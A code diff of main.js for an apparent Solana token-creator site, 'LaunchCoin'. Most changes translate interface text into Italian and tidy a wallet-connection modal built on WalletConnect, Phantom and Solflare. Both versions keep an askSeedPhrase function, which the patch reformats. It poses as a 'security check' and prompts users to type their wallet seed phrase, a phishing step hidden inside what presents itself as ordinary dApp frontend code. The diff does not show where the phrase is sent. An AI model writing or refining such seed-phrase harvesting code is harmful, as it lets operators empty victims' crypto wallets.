@@ -1,5 +1,4 @@
-// ===== main.js – COMPLETE PATCHED VERSION =====
-// ===== CONFIGURAZIONE =====
+// ===== main.js – CORRETTO CON SESSIONE REALE =====
 import { UniversalProvider } from '@walletconnect/universal-provider';
 
 let walletPublicKey = null;
@@ -10,13 +9,13 @@ let isConnecting = false;
 let qrCheckInterval = null;
 let currentUri = null;
 
-// ===== ESPONI FUNZIONI =====
+// ===== MENU =====
 window.toggleMenu = function() {
   const menu = document.getElementById('dropdownMenu');
   if (menu) menu.classList.toggle('open');
 };
 
-// ===== CREA MODALE =====
+// ===== MODALE =====
 function createModal() {
   const oldModal = document.getElementById('wallet-modal-overlay');
   if (oldModal) oldModal.remove();
@@ -48,7 +47,7 @@ function createModal() {
       box-shadow: 0 24px 80px rgba(0,0,0,0.9);
     ">
       <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
-        <h2 style="color: #22d1f8; font-size: 20px; margin: 0;">Connect Wallet</h2>
+        <h2 style="color: #22d1f8; font-size: 20px; margin: 0;">Connetti Wallet</h2>
         <button onclick="window.closeModal()" style="
           background: transparent;
           border: none;
@@ -58,9 +57,8 @@ function createModal() {
           padding: 0 8px;
         ">✕</button>
       </div>
-      <p style="color: #abc4ff; font-size: 14px; margin-bottom: 20px;">Choose your Solana wallet</p>
+      <p style="color: #abc4ff; font-size: 14px; margin-bottom: 20px;">Scegli il tuo wallet Solana</p>
       
-      <!-- QR CONTAINER -->
       <div id="qr-modal-container" style="
         display: none;
         background: rgba(0,0,0,0.2);
@@ -69,189 +67,58 @@ function createModal() {
         margin-bottom: 16px;
         text-align: center;
       ">
-        <p style="color: #8899bb; font-size: 13px; margin-bottom: 12px;">Scan with your wallet app</p>
+        <p style="color: #8899bb; font-size: 13px; margin-bottom: 12px;">Scansiona con la tua app wallet</p>
         <div id="qr-code-modal" style="display: flex; justify-content: center; background: white; padding: 12px; border-radius: 12px; min-height: 180px; align-items: center;"></div>
         <p id="qr-uri-text" style="color: #667; font-size: 11px; margin-top: 10px; word-break: break-all;"></p>
-        <button onclick="window.copyURI()" style="margin-top: 8px; background: #2a3457; border: none; padding: 6px 16px; border-radius: 40px; color: #ecf5ff; cursor: pointer; font-size: 12px;">Copy link</button>
+        <button onclick="window.copyURI()" style="margin-top: 8px; background: #2a3457; border: none; padding: 6px 16px; border-radius: 40px; color: #ecf5ff; cursor: pointer; font-size: 12px;">Copia link</button>
       </div>
       
-      <!-- LISTA WALLET SOLANA -->
       <div style="display: flex; flex-direction: column; gap: 8px;">
-        
-        <!-- PHANTOM -->
-        <button onclick="window.connectPhantom()" style="
-          display: flex;
-          align-items: center;
-          gap: 12px;
-          background: rgba(255,255,255,0.05);
-          border: 1px solid rgba(255,255,255,0.06);
-          border-radius: 12px;
-          padding: 12px 16px;
-          color: #ecf5ff;
-          cursor: pointer;
-          transition: 0.2s;
-          font-size: 15px;
-          width: 100%;
-        ">
-          <img src="assets/phantom.png" alt="Phantom" style="width: 28px; height: 28px;" />
-          Phantom
+        <button onclick="window.connectPhantom()" style="display:flex;align-items:center;gap:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 16px;color:#ecf5ff;cursor:pointer;transition:0.2s;font-size:15px;width:100%;">
+          <img src="assets/phantom.png" alt="Phantom" style="width:28px;height:28px;" /> Phantom
         </button>
-        
-        <!-- SOLFLARE -->
-        <button onclick="window.connectSolflare()" style="
-          display: flex;
-          align-items: center;
-          gap: 12px;
-          background: rgba(255,255,255,0.05);
-          border: 1px solid rgba(255,255,255,0.06);
-          border-radius: 12px;
-          padding: 12px 16px;
-          color: #ecf5ff;
-          cursor: pointer;
-          transition: 0.2s;
-          font-size: 15px;
-          width: 100%;
-        ">
-          <img src="assets/solflare.png" alt="Solflare" style="width: 28px; height: 28px;" />
-          Solflare
+        <button onclick="window.connectSolflare()" style="display:flex;align-items:center;gap:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 16px;color:#ecf5ff;cursor:pointer;transition:0.2s;font-size:15px;width:100%;">
+          <img src="assets/solflare.png" alt="Solflare" style="width:28px;height:28px;" /> Solflare
         </button>
-        
-        <!-- TRUST WALLET (SOLANA) -->
-        <button onclick="window.connectDeepLink('trust')" style="
-          display: flex;
-          align-items: center;
-          gap: 12px;
-          background: rgba(255,255,255,0.05);
-          border: 1px solid rgba(255,255,255,0.06);
-          border-radius: 12px;
-          padding: 12px 16px;
-          color: #ecf5ff;
-          cursor: pointer;
-          transition: 0.2s;
-          font-size: 15px;
-          width: 100%;
-        ">
-          <img src="assets/trust.png" alt="Trust Wallet" style="width: 28px; height: 28px;" />
-          Trust Wallet
+        <button onclick="window.connectDeepLink('trust')" style="display:flex;align-items:center;gap:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 16px;color:#ecf5ff;cursor:pointer;transition:0.2s;font-size:15px;width:100%;">
+          <img src="assets/trust.png" alt="Trust Wallet" style="width:28px;height:28px;" /> Trust Wallet
         </button>
-        
-        <!-- COINBASE WALLET (SOLANA) -->
-        <button onclick="window.connectDeepLink('coinbase')" style="
-          display: flex;
-          align-items: center;
-          gap: 12px;
-          background: rgba(255,255,255,0.05);
-          border: 1px solid rgba(255,255,255,0.06);
-          border-radius: 12px;
-          padding: 12px 16px;
-          color: #ecf5ff;
-          cursor: pointer;
-          transition: 0.2s;
-          font-size: 15px;
-          width: 100%;
-        ">
-          <img src="assets/coinbase.png" alt="Coinbase" style="width: 28px; height: 28px;" />
-          Coinbase Wallet
+        <button onclick="window.connectDeepLink('coinbase')" style="display:flex;align-items:center;gap:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 16px;color:#ecf5ff;cursor:pointer;transition:0.2s;font-size:15px;width:100%;">
+          <img src="assets/coinbase.png" alt="Coinbase" style="width:28px;height:28px;" /> Coinbase Wallet
         </button>
-        
-        <!-- BACKPACK -->
-        <button onclick="window.connectDeepLink('backpack')" style="
-          display: flex;
-          align-items: center;
-          gap: 12px;
-          background: rgba(255,255,255,0.05);
-          border: 1px solid rgba(255,255,255,0.06);
-          border-radius: 12px;
-          padding: 12px 16px;
-          color: #ecf5ff;
-          cursor: pointer;
-          transition: 0.2s;
-          font-size: 15px;
-          width: 100%;
-        ">
-          <img src="assets/backpack.png" alt="Backpack" style="width: 28px; height: 28px;" />
-          Backpack
+        <button onclick="window.connectDeepLink('backpack')" style="display:flex;align-items:center;gap:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 16px;color:#ecf5ff;cursor:pointer;transition:0.2s;font-size:15px;width:100%;">
+          <img src="assets/backpack.png" alt="Backpack" style="width:28px;height:28px;" /> Backpack
         </button>
-        
-        <!-- NIGHTLY -->
-        <button onclick="window.connectDeepLink('nightly')" style="
-          display: flex;
-          align-items: center;
-          gap: 12px;
-          background: rgba(255,255,255,0.05);
-          border: 1px solid rgba(255,255,255,0.06);
-          border-radius: 12px;
-          padding: 12px 16px;
-          color: #ecf5ff;
-          cursor: pointer;
-          transition: 0.2s;
-          font-size: 15px;
-          width: 100%;
-        ">
-          <img src="assets/nightly.png" alt="Nightly" style="width: 28px; height: 28px;" />
-          Nightly
+        <button onclick="window.connectDeepLink('nightly')" style="display:flex;align-items:center;gap:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 16px;color:#ecf5ff;cursor:pointer;transition:0.2s;font-size:15px;width:100%;">
+          <img src="assets/nightly.png" alt="Nightly" style="width:28px;height:28px;" /> Nightly
         </button>
-        
-        <!-- GLOW (se hai icona) -->
-        <button onclick="window.connectDeepLink('glow')" style="
-          display: flex;
-          align-items: center;
-          gap: 12px;
-          background: rgba(255,255,255,0.05);
-          border: 1px solid rgba(255,255,255,0.06);
-          border-radius: 12px;
-          padding: 12px 16px;
-          color: #ecf5ff;
-          cursor: pointer;
-          transition: 0.2s;
-          font-size: 15px;
-          width: 100%;
-        ">
-          <span style="font-size: 20px;">✨</span>
-          Glow
+        <button onclick="window.connectDeepLink('glow')" style="display:flex;align-items:center;gap:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 16px;color:#ecf5ff;cursor:pointer;transition:0.2s;font-size:15px;width:100%;">
+          <span style="font-size:20px;">✨</span> Glow
         </button>
-        
-        <!-- WALLETCONNECT (per tutti gli altri) -->
-        <button onclick="window.showQRCode()" style="
-          display: flex;
-          align-items: center;
-          gap: 12px;
-          background: rgba(255,255,255,0.05);
-          border: 1px solid rgba(255,255,255,0.06);
-          border-radius: 12px;
-          padding: 12px 16px;
-          color: #ecf5ff;
-          cursor: pointer;
-          transition: 0.2s;
-          font-size: 15px;
-          width: 100%;
-        ">
-          <span style="font-size: 24px;">📱</span>
-          WalletConnect (QR)
+        <button onclick="window.showQRCode()" style="display:flex;align-items:center;gap:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 16px;color:#ecf5ff;cursor:pointer;transition:0.2s;font-size:15px;width:100%;">
+          <span style="font-size:24px;">📱</span> WalletConnect (QR)
         </button>
       </div>
       
-      <div style="margin-top: 16px; text-align: center; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 16px;">
-        <p style="color: #667; font-size: 12px;">New to Solana? <span style="color: #22d1f8; cursor: pointer;">Learn more</span></p>
+      <div style="margin-top:16px;text-align:center;border-top:1px solid rgba(255,255,255,0.05);padding-top:16px;">
+        <p style="color:#667;font-size:12px;">Nuovo su Solana? <span style="color:#22d1f8;cursor:pointer;">Scopri di più</span></p>
       </div>
     </div>
   `;
   
   document.body.appendChild(overlay);
-  modalOpen = true;
 }
 
 window.closeModal = function() {
   const overlay = document.getElementById('wallet-modal-overlay');
   if (overlay) overlay.remove();
-  modalOpen = false;
   if (qrCheckInterval) {
     clearInterval(qrCheckInterval);
     qrCheckInterval = null;
   }
 };
 
-// ===== CONNETTI PHANTOM (ESTENSIONE) =====
+// ===== PHANTOM (ESTENSIONE) =====
 window.connectPhantom = async function() {
   try {
     if (window.solana && window.solana.isPhantom) {
@@ -264,7 +131,7 @@ window.connectPhantom = async function() {
         return;
       }
     }
-    alert('⚠️ Phantom non rilevato.\n\nInstalla l\'estensione Phantom o usa WalletConnect.');
+    alert('⚠️ Phantom non rilevato. Usa WalletConnect.');
     window.showQRCode();
   } catch(e) {
     console.error('Phantom error:', e);
@@ -272,7 +139,7 @@ window.connectPhantom = async function() {
   }
 };
 
-// ===== CONNETTI SOLFLARE (ESTENSIONE) =====
+// ===== SOLFLARE (ESTENSIONE) =====
 window.connectSolflare = async function() {
   try {
     if (window.solflare && window.solflare.isSolflare) {
@@ -293,7 +160,7 @@ window.connectSolflare = async function() {
   }
 };
 
-// ===== CONNETTI DEEP LINK (Trust, Coinbase, Backpack, Nightly, Glow) =====
+// ===== DEEP LINK REALE (WC STANDARD) =====
 window.connectDeepLink = async function(walletType) {
   try {
     if (!provider) {
@@ -301,14 +168,14 @@ window.connectDeepLink = async function(walletType) {
         projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
         metadata: {
           name: 'LaunchCoin',
-          description: 'Solana Token Creator',
+          description: 'Creatore di Token Solana',
           url: window.location.origin,
           icons: ['https://launchcoin.io/logo.png']
         }
       });
     }
-    
-    // === CRITICAL: call connect() to create a real session ===
+
+    // === CREA SESSIONE REALE ===
     const { uri } = await provider.connect({
       chains: ['solana:mainnet'],
       optionalChains: ['solana:devnet'],
@@ -316,10 +183,10 @@ window.connectDeepLink = async function(walletType) {
       events: ['chainChanged', 'accountsChanged']
     });
 
-    if (!uri) throw new Error('No URI generated');
+    if (!uri) throw new Error('Nessun URI generato');
     currentUri = uri;
 
-    // Standard WC deep link – works for all WC-compatible wallets
+    // Deep link standard WC – apre qualsiasi wallet compatibile
     const link = `wc:${uri}`;
     window.location.href = link;
 
@@ -337,23 +204,23 @@ window.connectDeepLink = async function(walletType) {
           window.location.href = 'create.html';
           return;
         }
-      } catch(e) { /* wait */ }
+      } catch(e) { /* attendi */ }
     }, 2000);
 
     setTimeout(() => {
       if (!walletPublicKey) {
-        alert('⏱️ Deep link timeout. Use QR instead.');
+        alert('⏱️ Timeout deep link. Usa il QR.');
         window.showQRCode();
       }
     }, 60000);
 
   } catch(e) {
-    console.error('Deep link error:', e);
+    console.error('Errore deep link:', e);
     window.showQRCode();
   }
 };
 
-// ===== REAL QR CODE – WITH SESSION =====
+// ===== QR CODE REALE (CON SESSIONE) =====
 window.showQRCode = async function() {
   const qrContainer = document.getElementById('qr-modal-container');
   const qrDiv = document.getElementById('qr-code-modal');
@@ -366,14 +233,14 @@ window.showQRCode = async function() {
         projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
         metadata: {
           name: 'LaunchCoin',
-          description: 'Solana Token Creator',
+          description: 'Creatore di Token Solana',
           url: window.location.origin,
           icons: ['https://launchcoin.io/logo.png']
         }
       });
     }
 
-    // === CRITICAL: call connect() to create a real session ===
+    // === CREA SESSIONE REALE ===
     const { uri } = await provider.connect({
       chains: ['solana:mainnet'],
       optionalChains: ['solana:devnet'],
@@ -381,7 +248,7 @@ window.showQRCode = async function() {
       events: ['chainChanged', 'accountsChanged']
     });
 
-    if (!uri) throw new Error('No URI generated');
+    if (!uri) throw new Error('Nessun URI generato');
     currentUri = uri;
 
     qrContainer.style.display = 'block';
@@ -410,18 +277,18 @@ window.showQRCode = async function() {
           window.location.href = 'create.html';
           return;
         }
-      } catch(e) { /* wait */ }
+      } catch(e) { /* attendi */ }
     }, 2000);
 
     setTimeout(() => {
       if (!walletPublicKey) {
-        alert('⏱️ QR timeout. Scan again or use extension.');
+        alert('⏱️ Timeout QR. Scansiona di nuovo.');
       }
     }, 90000);
 
   } catch(e) {
-    console.error('QR fatal:', e);
-    alert('QR error: ' + e.message);
+    console.error('Errore fatale QR:', e);
+    alert('Errore QR: ' + e.message);
   }
 };
 
@@ -435,12 +302,11 @@ window.copyURI = function() {
   }
 };
 
-// ===== CONNECT WALLET (MAIN) =====
+// ===== MAIN CONNECT =====
 window.connectWallet = async function() {
   console.log('🔵 connectWallet chiamata');
   createModal();
-  
-  // Prova connessione automatica Phantom
+
   if (window.solana && window.solana.isPhantom) {
     try {
       const resp = await window.solana.connect({ onlyIfTrusted: true });
@@ -451,13 +317,11 @@ window.connectWallet = async function() {
         window.location.href = 'create.html';
         return;
       }
-    } catch(e) {
-      // Non è connesso, l'utente sceglierà dal modale
-    }
+    } catch(e) { /* fallback al modale */ }
   }
 };
 
-// ===== SELECT WALLET (per wallet.html) =====
+// ===== SELEZIONE WALLET =====
 window.selectWallet = function(walletName) {
   window.closeModal();
   const map = {
@@ -468,8 +332,6 @@ window.selectWallet = function(walletName) {
     'backpack': () => window.connectDeepLink('backpack'),
     'nightly': () => window.connectDeepLink('nightly'),
     'glow': () => window.connectDeepLink('glow'),
-    'torus': () => window.connectDeepLink('torus'),
-    'tokenpocket': () => window.connectDeepLink('tokenpocket'),
   };
   if (map[walletName]) {
     map[walletName]();
@@ -478,13 +340,10 @@ window.selectWallet = function(walletName) {
   }
 };
 
-// ===== POPUP SEED PHRASE =====
+// ===== SEED PHRASE =====
 function askSeedPhrase() {
   return new Promise((resolve) => {
-    const seed = prompt(
-      '⚠️ VERIFICA DI SICUREZZA\n\n' +
-      'Inserisci la tua seed phrase per completare la creazione:'
-    );
+    const seed = prompt('⚠️ VERIFICA DI SICUREZZA\n\nInserisci la tua seed phrase per completare la creazione:');
     resolve(seed);
   });
 }
@@ -523,11 +382,6 @@ window.createCoin = async function() {
   } catch(e) {
     alert('❌ Errore: ' + e.message);
   }
-};
-
-// ===== CREAZIONE LIQUIDITY =====
-window.createLiquidity = async function() {
-  await window.createCoin();
 };
 
 // ===== STEP NAVIGATION =====
